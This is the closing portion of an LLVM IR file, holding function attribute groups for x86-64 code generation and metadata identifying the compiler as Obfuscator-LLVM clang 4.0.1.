attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146846898}
!2 = !{i32 -2146846489}
